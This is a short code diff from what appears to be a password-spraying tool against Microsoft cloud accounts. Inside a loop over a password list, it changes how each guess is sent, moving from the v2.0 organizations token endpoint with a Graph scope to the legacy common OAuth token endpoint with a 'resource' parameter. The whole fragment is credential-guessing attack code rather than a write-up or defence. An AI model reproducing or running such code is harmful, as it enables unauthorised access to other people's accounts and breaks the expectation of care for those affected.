@@ -257,11 +257,10 @@ for pwd_index, password in enumerate(passwords):
 
         body = {
             'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
-            'client_info': '1',
             'grant_type': 'password',
             'username': username,
             'password': password,
-            'scope': 'https://graph.microsoft.com/.default openid',
+            'resource': 'https://graph.windows.net',
         }
 
         headers = {
@@ -270,7 +269,7 @@ for pwd_index, password in enumerate(passwords):
         }
 
         try:
-            r = requests.post(f"{url}/organizations/oauth2/v2.0/token", headers=headers, data=body)
+            r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
         except requests.exceptions.ConnectionError:
             warn(f"Connection error on {username}")
             continue
